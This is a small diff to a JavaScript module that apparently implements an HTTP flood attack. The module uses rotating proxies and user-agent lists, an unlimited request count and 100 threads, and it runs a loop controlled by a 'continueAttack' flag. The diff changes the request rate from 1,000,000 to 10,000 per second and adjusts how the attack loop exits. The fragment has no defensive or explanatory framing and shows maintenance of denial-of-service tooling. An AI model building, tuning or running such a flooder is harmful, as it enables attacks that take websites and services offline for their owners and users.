@@ -69,7 +69,7 @@ const acceptHeaders = [
 const proxyFilePath = path.join(__dirname, "proxy.txt");
 const ualist = path.join(__dirname, "ua.txt");
 const maxRequests = Number.MAX_SAFE_INTEGER;
-const requestsPerSecond = 1000000;
+const requestsPerSecond = 10000;
 const numThreads = 100;
 
 const getRandomElement = (arr) => arr[Math.floor(Math.random() * arr.length)];
@@ -174,7 +174,7 @@ module.exports.run = async ({
     };
 
     for (let i = 0; i < numThreads; i++) {
-        if (!continueAttack) return;
+        if (!continueAttack) break;
 
         const randomProxy = getRandomElement(proxies);
         const proxyParts = randomProxy.split(":");
